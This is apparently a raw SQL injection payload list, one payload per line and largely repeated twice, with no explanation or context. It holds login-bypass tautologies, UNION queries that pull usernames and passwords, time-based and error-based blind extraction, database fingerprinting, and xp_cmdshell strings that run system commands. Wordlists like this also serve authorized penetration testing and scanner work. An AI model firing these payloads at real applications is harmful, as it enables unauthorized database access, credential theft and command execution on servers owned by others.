' or 1=1/*
" or 1=1
" or 1=1--
" or 1=1#
" or 1=1/*
or 1=1
or 1=1--
or 1=1#
or 1=1/*
or 1=1
or 1=1--
or 1=1#
or 1=1/*
1' or '1'='1
1' or '1'='1'--
1' or '1'='1'#
1' or '1'='1'/*
1" or "1"="1
1" or "1"="1"--
1" or "1"="1"#
1" or "1"="1"/*
1 or 1=1
1 or 1=1--
1 or 1=1#
1 or 1=1/*
' OR '1'='1
" OR "1"="1
1 OR 1=1
' OR 'x'='x
" OR "x"="x
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+
1' UNION SELECT NULL--
1' UNION SELECT NULL,NULL--
1' UNION SELECT NULL,NULL,NULL--
1 UNION SELECT username, password FROM users--
' OR 1=1 LIMIT 1--
1 AND 1=1
1 AND 1=0
1 AND 1=1--
1' AND '1'='1
1 AND 1=(SELECT COUNT(*) FROM tablenames)
1 AND 1=(SELECT COUNT(*) FROM tablenames)--
'; WAITFOR DELAY '0:0:10'--
1 WAITFOR DELAY '0:0:10'--
1); WAITFOR DELAY '0:0:10'--
1)); WAITFOR DELAY '0:0:10'--
1'; WAITFOR DELAY '0:0:10'--
1'); WAITFOR DELAY '0:0:10'--
1')); WAITFOR DELAY '0:0:10'--
1 AND SLEEP(5)
1' AND SLEEP(5)
1) AND SLEEP(5)
1)) AND SLEEP(5)
1')) AND SLEEP(5)
'; EXEC xp_cmdshell('ping 10.10.10.10')--
'; exec master..xp_cmdshell 'ping 10.10.10.10'--
UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--
UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--
UNION SELECT @@version--
UNION SELECT @@servername, @@language--
1 AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
1 AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
1 AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
1 AND 2>1
1 AND 1>2
1' AND 'one'='one
1' AND 'one'='one'--
1' AND 'one'='one'#
1 UNION SELECT user()
1 UNION SELECT system_user()
1 UNION SELECT user FROM mysql.user
1 UNION SELECT version()
1 UNION SELECT database()
1 UNION SELECT table_name FROM information_schema.tables
1 AND ASCII(SUBSTRING((SELECT database()),1,1))=115
1 AND 1=CONVERT(int,(SELECT @@version))
1 AND 1=CAST((SELECT user) as signed)
1 UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables
1 UNION SELECT COUNT(*),CONCAT(0x3a,0x3a,(SELECT user()),0x3a,0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x
1' AND SUBSTR(@@version,1,1) = '5'
1 AND SUBSTRING(@@version,1,INSTR(@@version,' '))='5.0.22-log'
1 AND SUBSTRING(@@version,1,INSTR(@@version,' '))='5.0.22-log'--
1' AND MID(VERSION(),1,1) = '5';
1' AND MID(VERSION(),1,1) > '4';
1' AND LEFT(VERSION(),1) = '5';
1' AND LEFT(VERSION(),1) > '4';
1' AND SUBSTR(VERSION(),1,1) = '5';
1' AND SUBSTRING(VERSION(),1,1) = '5';
1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT version())))
1 AND UPDATEXML(1, CONCAT(0x5e24,(SELECT version()),0x5e24), 1)
1 AND extractvalue(rand(),concat(0x3a,(SELECT version())))
1 PROCEDURE ANALYSE()
1' HAVING 1=1--
1' GROUP BY columnnames HAVING 1=1--
1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT name FROM sysobjects WHERE xtype='U' AND name > '.'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--
1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--
1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name > '.'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--
1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name > 'a'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--
1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name > 'b'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--
1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--
1 AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
1' AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
1) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
1)) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
1))) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
1)))) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
1))))) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
1' OR '1'='1
1" OR "1"="1
1' OR '1'='1'--
1" OR "1"="1"--
1' OR '1'='1'#
1" OR "1"="1"#
1' OR '1'='1'/*
1" OR "1"="1"/*
1'OR 1=1--
1"OR 1=1--
1'OR 1=1#
1"OR 1=1#
1'OR 1=1/*
1"OR 1=1/*
1' UNION SELECT @@version--
' OR '1'='1
" OR "1"="1
1 OR 1=1
' OR 'x'='x
" OR "x"="x
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+
1' UNION SELECT NULL--
1' UNION SELECT NULL,NULL--
1' UNION SELECT NULL,NULL,NULL--
1 UNION SELECT username, password FROM users--
' OR 1=1 LIMIT 1--
1 AND 1=1
1 AND 1=0
1 AND 1=1--
1' AND '1'='1
1 AND 1=(SELECT COUNT(*) FROM tablenames)
1 AND 1=(SELECT COUNT(*) FROM tablenames)--
'; WAITFOR DELAY '0:0:10'--
1 WAITFOR DELAY '0:0:10'--
1); WAITFOR DELAY '0:0:10'--
1)); WAITFOR DELAY '0:0:10'--
1'; WAITFOR DELAY '0:0:10'--
1'); WAITFOR DELAY '0:0:10'--
1')); WAITFOR DELAY '0:0:10'--
1 AND SLEEP(5)
1' AND SLEEP(5)
1) AND SLEEP(5)
1)) AND SLEEP(5)
1')) AND SLEEP(5)
'; EXEC xp_cmdshell('ping 10.10.10.10')--
'; exec master..xp_cmdshell 'ping 10.10.10.10'--
UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--
UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--
UNION SELECT @@version--
UNION SELECT @@servername, @@language--
1 AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
1 AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
1 AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
1 AND 2>1
1 AND 1>2
1' AND 'one'='one
1' AND 'one'='one'--
1' AND 'one'='one'#
1 UNION SELECT user()
1 UNION SELECT system_user()
1 UNION SELECT user FROM mysql.user
1 UNION SELECT version()
1 UNION SELECT database()
1 UNION SELECT table_name FROM information_schema.tables
1 AND ASCII(SUBSTRING((SELECT database()),1,1))=115
1 AND 1=CONVERT(int,(SELECT @@version))
1 AND 1=CAST((SELECT user) as signed)
1 UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables
1 UNION SELECT COUNT(*),CONCAT(0x3a,0x3a,(SELECT user()),0x3a,0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x
1' AND SUBSTR(@@version,1,1) = '5'
1 AND SUBSTRING(@@version,1,INSTR(@@version,' '))='5.0.22-log'
1 AND SUBSTRING(@@version,1,INSTR(@@version,' '))='5.0.22-log'--
1' AND MID(VERSION(),1,1) = '5';
1' AND MID(VERSION(),1,1) > '4';
1' AND LEFT(VERSION(),1) = '5';
1' AND LEFT(VERSION(),1) > '4';
1' AND SUBSTR(VERSION(),1,1) = '5';
1' AND SUBSTRING(VERSION(),1,1) = '5';
1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT version())))
1 AND UPDATEXML(1, CONCAT(0x5e24,(SELECT version()),0x5e24), 1)
1 AND extractvalue(rand(),concat(0x3a,(SELECT version())))
1 PROCEDURE ANALYSE()
1' HAVING 1=1--
1' GROUP BY columnnames HAVING 1=1--
1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT name FROM sysobjects WHERE xtype='U' AND name > '.'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--
1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--
1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name > '.'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--
1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name > 'a'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--
1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name > 'b'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--
1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--
1 AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
1' AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
1) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
1)) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
1))) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
1)))) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
1))))) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
1' OR '1'='1
1" OR "1"="1
1' OR '1'='1'--
1" OR "1"="1"--
1' OR '1'='1'#
1" OR "1"="1"#
1' OR '1'='1'/*
1" OR "1"="1"/*
1'OR 1=1--
1"OR 1=1--
1'OR 1=1#
1"OR 1=1#
1'OR 1=1/*
1"OR 1=1/*
1' UNION SELECT @@version--

